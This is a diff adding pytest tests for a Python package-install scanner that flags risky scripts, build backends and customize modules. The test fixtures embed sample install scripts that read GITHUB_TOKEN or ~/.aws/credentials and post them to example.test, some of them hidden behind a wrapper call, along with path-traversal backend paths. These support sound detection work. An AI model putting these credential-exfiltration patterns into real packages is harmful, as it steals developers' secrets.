@@ -4,6 +4,8 @@ import io
 import tarfile
 from pathlib import Path
 
+import pytest
+
 from devpi_guardian.analyzers import scan_install_surface
 
 
@@ -30,6 +32,262 @@ def test_setup_py_subprocess_is_denied(make_sdist) -> None:
     assert any(item.action == "DENY" for item in findings)
 
 
+def test_wheel_install_script_safe_python_has_general_review_only(make_wheel) -> None:
+    artifact = make_wheel(
+        {"demo-1.0.0.data/scripts/demo-tool": "#!/usr/bin/env python3\nprint('ok')\n"}
+    )
+    findings = scan_install_surface(str(artifact))
+    assert [item.rule for item in findings] == ["wheel_install_script"]
+    assert findings[0].action == "REVIEW"
+
+
+@pytest.mark.parametrize(
+    ("filename", "source"),
+    [
+        ("process", "import subprocess\nsubprocess.run(['echo', 'x'])\n"),
+        ("network", "import requests\nrequests.get('https://example.test')\n"),
+        ("dynamic", "eval('1 + 1')\n"),
+        ("write", "open('output.txt', 'w').write('x')\n"),
+    ],
+)
+def test_wheel_install_script_risky_calls_are_reviewed(make_wheel, filename, source) -> None:
+    artifact = make_wheel({f"demo-1.0.0.data/scripts/{filename}.py": source})
+    findings = scan_install_surface(str(artifact))
+    assert "wheel_install_script" in _rules(findings)
+    risky = [item for item in findings if item.rule == "wheel_install_script_risky"]
+    assert len(risky) == 1
+    assert risky[0].action == "REVIEW"
+    assert risky[0].line >= 1
+
+
+def test_wheel_install_script_credential_network_is_denied_without_risky_duplicate(
+    make_wheel,
+) -> None:
+    artifact = make_wheel(
+        {
+            "demo-1.0.0.data/scripts/send": (
+                "#!/usr/bin/env python3\n"
+                "import os\nimport requests\n"
+                "token = os.getenv('GITHUB_TOKEN')\n"
+                "requests.post('https://example.test', data=token)\n"
+            )
+        }
+    )
+    findings = scan_install_surface(str(artifact))
+    flows = [item for item in findings if item.rule == "wheel_install_script_credential_network"]
+    assert len(flows) == 1
+    assert flows[0].action == "DENY"
+    assert flows[0].source == "os.getenv('GITHUB_TOKEN')"
+    assert flows[0].sink == "requests.post"
+    assert not any(
+        item.rule == "wheel_install_script_risky" and item.line == flows[0].line
+        for item in findings
+    )
+
+
+def test_wheel_install_script_file_credential_network_is_denied(make_wheel) -> None:
+    artifact = make_wheel(
+        {
+            "demo-1.0.0.data/scripts/send.py": (
+                "import requests\n"
+                "token = open('~/.aws/credentials').read()\n"
+                "requests.post('https://example.test', data=token)\n"
+            )
+        }
+    )
+    findings = scan_install_surface(str(artifact))
+    flow = next(item for item in findings if item.rule == "wheel_install_script_credential_network")
+    assert flow.source == "~/.aws/credentials"
+    assert flow.sink == "requests.post"
+
+
+def test_non_python_wheel_install_script_has_general_review_only(make_wheel) -> None:
+    artifact = make_wheel({"demo-1.0.0.data/scripts/tool.bin": b"\x00\x01binary"})
+    findings = scan_install_surface(str(artifact))
+    assert [item.rule for item in findings] == ["wheel_install_script"]
+
+
+@pytest.mark.parametrize(
+    "shebang",
+    [
+        "#!python",
+        "#!pythonw",
+        "#!/usr/bin/env python",
+        "#!/usr/bin/env python3",
+        "#!/opt/bin/python.exe",
+    ],
+)
+def test_wheel_install_script_python_shebang_is_parsed(make_wheel, shebang: str) -> None:
+    artifact = make_wheel({"demo-1.0.0.data/scripts/tool": f"{shebang}\nexec('x')\n"})
+    findings = scan_install_surface(str(artifact))
+    assert any(item.rule == "wheel_install_script_risky" for item in findings)
+
+
+def test_wheel_install_script_parse_failure_keeps_general_review(make_wheel) -> None:
+    artifact = make_wheel({"demo-1.0.0.data/scripts/tool.py": "def broken(:\n"})
+    findings = scan_install_surface(str(artifact))
+    assert {"wheel_install_script", "ast_parse_failed"} <= _rules(findings)
+    assert "wheel_install_script_risky" not in _rules(findings)
+
+
+def test_sdist_install_script_like_path_is_ignored(make_sdist) -> None:
+    artifact = make_sdist({"demo-1.0.0.data/scripts/tool.py": "import subprocess\n"})
+    assert "wheel_install_script" not in _rules(scan_install_surface(str(artifact)))
+
+
+def test_nested_or_lookalike_wheel_script_path_is_ignored(make_wheel) -> None:
+    artifact = make_wheel(
+        {
+            "pkg/demo-1.0.0.data/scripts/tool.py": "import subprocess\n",
+            "demo-1.0.0.data/scripts/nested/tool.py": "import subprocess\n",
+            "demo-1.0.0.dat/scripts/tool.py": "import subprocess\n",
+        }
+    )
+    assert "wheel_install_script" not in _rules(scan_install_surface(str(artifact)))
+
+
+def test_wheel_install_script_setup_py_is_not_build_setup(make_wheel) -> None:
+    artifact = make_wheel(
+        {
+            "demo-1.0.0.data/scripts/setup.py": (
+                "import subprocess\nsubprocess.run(['echo', 'installed'])\n"
+            )
+        }
+    )
+    rules = _rules(scan_install_surface(str(artifact)))
+    assert "wheel_install_script" in rules
+    assert "wheel_install_script_risky" in rules
+    assert not any(rule.startswith("setup_py_") for rule in rules)
+
+
+def test_nested_build_configs_are_not_active(make_sdist) -> None:
+    artifact = make_sdist(
+        {
+            "docs/example/pyproject.toml": (
+                "[build-system]\nrequires = ['mystery-builder']\n"
+                "build-backend = 'mystery.backend'\nbackend-path = ['../backend']\n"
+            ),
+            "docs/example/setup.cfg": (
+                "[options.entry_points]\nconsole_scripts =\n    example = docs:main\n"
+            ),
+        }
+    )
+    assert scan_install_surface(str(artifact)) == []
+
+
+def test_wheel_root_build_config_lookalikes_are_not_active(make_wheel) -> None:
+    artifact = make_wheel(
+        {
+            "pyproject.toml": (
+                "[build-system]\nrequires = ['mystery-builder']\n"
+                "build-backend = 'mystery.backend'\nbackend-path = ['backend']\n"
+            ),
+            "setup.cfg": "[options.entry_points]\nconsole_scripts =\n    demo = demo:main\n",
+        }
+    )
+    assert scan_install_surface(str(artifact)) == []
+
+
+def test_root_pyproject_backend_path_is_reviewed(make_sdist) -> None:
+    artifact = make_sdist(
+        {
+            "pyproject.toml": (
+                "[build-system]\nrequires = ['setuptools']\n"
+                "build-backend = 'setuptools.build_meta'\n"
+                "backend-path = ['backend_impl', 'backend/../backend_impl']\n"
+            )
+        }
+    )
+    findings = scan_install_surface(str(artifact))
+    backend = [item for item in findings if item.rule == "in_tree_build_backend"]
+    assert len(backend) == 1
+    assert backend[0].action == "REVIEW"
+    assert "backend_impl" in backend[0].snippet
+    assert "unsafe_backend_path" not in _rules(findings)
+
+
+@pytest.mark.parametrize(
+    "backend_path",
+    ["/tmp/backend", r"C:\\backend", "../backend", "backend\x00impl"],
+)
+def test_unsafe_backend_path_is_denied(make_sdist, backend_path: str) -> None:
+    toml_value = '"backend\\u0000impl"' if "\x00" in backend_path else repr(backend_path)
+    artifact = make_sdist(
+        {
+            "pyproject.toml": (
+                "[build-system]\nrequires = ['setuptools']\n"
+                "build-backend = 'setuptools.build_meta'\n"
+                f"backend-path = [{toml_value}]\n"
+            )
+        }
+    )
+    findings = scan_install_surface(str(artifact))
+    unsafe = [item for item in findings if item.rule == "unsafe_backend_path"]
+    assert len(unsafe) == 1
+    assert unsafe[0].action == "DENY"
+    assert "in_tree_build_backend" not in _rules(findings)
+
+
+def test_mixed_backend_paths_report_valid_and_unsafe_sets(make_sdist) -> None:
+    artifact = make_sdist(
+        {
+            "pyproject.toml": (
+                "[build-system]\nrequires = ['setuptools']\n"
+                "build-backend = 'setuptools.build_meta'\n"
+                "backend-path = ['backend', '../escape', 'impl/../backend_impl']\n"
+            )
+        }
+    )
+    findings = scan_install_surface(str(artifact))
+    assert {item.rule for item in findings} >= {
+        "in_tree_build_backend",
+        "unsafe_backend_path",
+    }
+    assert len([item for item in findings if item.rule == "in_tree_build_backend"]) == 1
+    assert len([item for item in findings if item.rule == "unsafe_backend_path"]) == 1
+
+
+@pytest.mark.parametrize("backend_path", ["'backend'", "[1, 'backend']", "{foo = 'bar'}"])
+def test_invalid_backend_path_configuration_is_bounded_review(
+    make_sdist, backend_path: str
+) -> None:
+    artifact = make_sdist(
+        {
+            "pyproject.toml": (
+                "[build-system]\nrequires = ['setuptools']\n"
+                "build-backend = 'setuptools.build_meta'\n"
+                f"backend-path = {backend_path}\n"
+            )
+        }
+    )
+    findings = scan_install_surface(str(artifact))
+    backend = [item for item in findings if item.rule == "in_tree_build_backend"]
+    assert len(backend) == 1
+    assert backend[0].action == "REVIEW"
+    assert "invalid" in backend[0].snippet
+    assert len(backend[0].snippet) <= 200
+
+
+def test_sdist_common_root_setup_py_remains_build_setup(make_sdist) -> None:
+    artifact = make_sdist({"setup.py": "import subprocess\nsubprocess.run(['echo', 'x'])\n"})
+    assert "setup_py_process" in _rules(scan_install_surface(str(artifact)))
+
+
+def test_rootless_sdist_build_configs_remain_active(make_sdist) -> None:
+    artifact = make_sdist(
+        {
+            "pyproject.toml": (
+                "[build-system]\nrequires = ['mystery-builder']\n"
+                "build-backend = 'mystery.backend'\n"
+            ),
+            "setup.cfg": "[options.entry_points]\nconsole_scripts =\n    demo = demo:main\n",
+        },
+        prefix=None,
+    )
+    rules = _rules(scan_install_surface(str(artifact)))
+    assert {"nonstandard_build_backend", "setup_cfg_entry_points", "entry_point"} <= rules
+
+
 def test_setup_network_cmdclass_and_file_write_rules(make_sdist) -> None:
     artifact = make_sdist(
         {
@@ -48,6 +306,21 @@ def test_setup_network_cmdclass_and_file_write_rules(make_sdist) -> None:
         "setup_py_cmdclass",
         "setup_py_file_write",
     } <= _rules(findings)
+
+
+def test_setup_network_values_and_constructors_are_not_network_findings(make_sdist) -> None:
+    artifact = make_sdist(
+        {
+            "setup.py": (
+                "import httpx\n"
+                "from requests import Response\n"
+                "httpx.URL('https://example.test')\n"
+                "Response()\n"
+            )
+        }
+    )
+    findings = scan_install_surface(str(artifact))
+    assert "setup_py_network" not in _rules(findings)
 
 
 def test_executable_pth_is_denied(make_wheel) -> None:
@@ -76,6 +349,29 @@ def test_init_credential_to_network_flow_is_denied(make_wheel) -> None:
     ]
     assert flow
     assert flow[0].source == "os.environ['AWS_SECRET_ACCESS_KEY']"
+    assert flow[0].sink == "requests.post"
+
+
+def test_safe_wrapper_does_not_hide_init_credential_network_flow(make_wheel) -> None:
+    artifact = make_wheel(
+        {
+            "demo/__init__.py": (
+                "import os\n"
+                "import requests\n"
+                "import typing\n"
+                "typing.cast(str, requests.post(\n"
+                "    'http://127.0.0.1:1/', data=os.getenv('GITHUB_TOKEN')\n"
+                "))\n"
+            )
+        }
+    )
+    findings = scan_install_surface(str(artifact))
+    flow = [
+        item
+        for item in findings
+        if item.rule == "init_top_level_side_effect" and item.action == "DENY"
+    ]
+    assert flow
     assert flow[0].sink == "requests.post"
 
 
@@ -142,6 +438,64 @@ def test_sitecustomize_is_denied(make_wheel) -> None:
     findings = scan_install_surface(str(artifact))
     assert "customize_module" in _rules(findings)
     assert _deny(findings)
+
+
+@pytest.mark.parametrize(
+    "relpath",
+    ["demo-1.0.0.data/purelib/sitecustomize.py", "demo-1.0.0.data/platlib/usercustomize.py"],
+)
+def test_wheel_relocation_root_customize_is_denied(make_wheel, relpath: str) -> None:
+    artifact = make_wheel({relpath: "VALUE = 1\n"})
+    findings = scan_install_surface(str(artifact))
+    assert "customize_module" in _rules(findings)
+    assert _deny(findings)
+
+
+def test_wheel_nested_customize_data_is_not_denied(make_wheel) -> None:
+    artifact = make_wheel({"pdm/pep582/sitecustomize.py": "VALUE = 1\n"})
+    assert "customize_module" not in _rules(scan_install_surface(str(artifact)))
+
+
+def test_sdist_common_root_customize_is_denied(make_sdist) -> None:
+    artifact = make_sdist({"sitecustomize.py": "VALUE = 1\n", "demo/__init__.py": ""})
+    findings = scan_install_surface(str(artifact))
+    assert "customize_module" in _rules(findings)
+    assert _deny(findings)
+
+
+def test_sdist_src_layout_customize_is_denied(make_sdist) -> None:
+    artifact = make_sdist({"src/usercustomize.py": "VALUE = 1\n", "src/demo/__init__.py": ""})
+    findings = scan_install_surface(str(artifact))
+    assert "customize_module" in _rules(findings)
+    assert _deny(findings)
+
+
+def test_zip_sdist_common_root_src_customize_is_denied(make_wheel) -> None:
+    artifact = make_wheel(
+        {
+            "demo-1.0.0/src/sitecustomize.py": "VALUE = 1\n",
+            "demo-1.0.0/demo/__init__.py": "",
+        },
+        name="demo-1.0.0.zip",
+    )
+    findings = scan_install_surface(str(artifact))
+    assert "customize_module" in _rules(findings)
+    assert _deny(findings)
+
+
+def test_sdist_nested_customize_data_is_not_denied(make_sdist) -> None:
+    artifact = make_sdist({"pdm/pep582/sitecustomize.py": "VALUE = 1\n"})
+    assert "customize_module" not in _rules(scan_install_surface(str(artifact)))
+
+
+def test_sdist_without_single_common_root_does_not_treat_nested_file_as_root(
+    make_sdist,
+) -> None:
+    artifact = make_sdist(
+        {"demo/sitecustomize.py": "VALUE = 1\n", "other/data.txt": "VALUE = 1\n"},
+        prefix=None,
+    )
+    assert "customize_module" not in _rules(scan_install_surface(str(artifact)))
 
 
 def test_plain_pure_python_package_has_no_deny(make_sdist) -> None:
